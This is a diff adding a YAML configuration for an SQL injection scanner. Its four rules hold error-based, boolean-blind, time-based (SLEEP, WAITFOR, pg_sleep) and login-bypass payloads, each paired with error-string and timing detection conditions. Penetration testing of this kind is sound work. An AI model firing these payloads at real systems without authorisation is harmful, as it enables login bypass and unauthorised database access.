@@ -1,0 +1,76 @@
+# SQL Injection Testing Config
+# No filters or targets specified - payloads will be applied to all parameters
+# across all requests in the capture file.
+
+rules:
+  # Rule 1: Error-based SQLi
+  # Injects syntax-breaking payloads and watches for database error strings
+  - payloads:
+      type: list
+      source:
+        - "'"
+        - "''"
+        - "') OR ('1'='1"
+        - "' OR '1'='1'--"
+        - "' OR '1'='2'--"
+        - "' ORDER BY 1--"
+        - "' ORDER BY 10--"
+        - "' UNION SELECT NULL--"
+        - "' UNION SELECT NULL,NULL--"
+        - "' UNION SELECT NULL,NULL,NULL--"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "sql syntax|you have an error|unclosed quotation|ORA-[0-9]+|PSQLException|SQLite3|SQLSTATE|microsoft ole db|incorrect syntax|mysql_fetch|warning: mysql|pg_query"
+      status_code: 500
+
+  # Rule 2: Boolean-based blind SQLi
+  # No error will be visible - relies on diff analysis to catch response size
+  # anomalies between true (1=1) and false (1=2) conditions.
+  # Run with --diff-analysis for this to be effective.
+  - payloads:
+      type: list
+      source:
+        - "1 AND 1=1--"
+        - "1 AND 1=2--"
+        - "' AND 'a'='a'--"
+        - "' AND 'a'='b'--"
+        - "1' AND '1'='1"
+        - "1' AND '1'='2"
+    conditions:
+      match_mode: "any"
+      status_code: 500
+
+  # Rule 3: Time-based blind SQLi
+  # Covers MySQL, MSSQL, and PostgreSQL sleep functions.
+  # Flag anything that takes longer than 4.5s to account for network jitter.
+  - payloads:
+      type: list
+      source:
+        - "' AND SLEEP(5)--"
+        - "1' AND SLEEP(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+        - "1; WAITFOR DELAY '0:0:5'--"
+        - "'; SELECT pg_sleep(5)--"
+        - "') AND SLEEP(5)--"
+    conditions:
+      match_mode: "any"
+      response_time_gt: 4.5
+
+  # Rule 4: Auth bypass via login fields
+  # Specifically targets login endpoints - an auth bypass via SQLi would
+  # result in a redirect or a "welcome" style response.
+  - filter:
+      url_path_contains: /login
+    payloads:
+      type: list
+      source:
+        - "admin'--"
+        - "admin' OR '1'='1'--"
+        - "' OR 1=1--"
+        - "admin'/*"
+        - "' OR 'x'='x"
+    conditions:
+      match_mode: "any"
+      status_code: [200, 302]
+      string_in_body: "welcome"
+      regex_in_body: "sql syntax|you have an error|unclosed quotation|SQLSTATE"
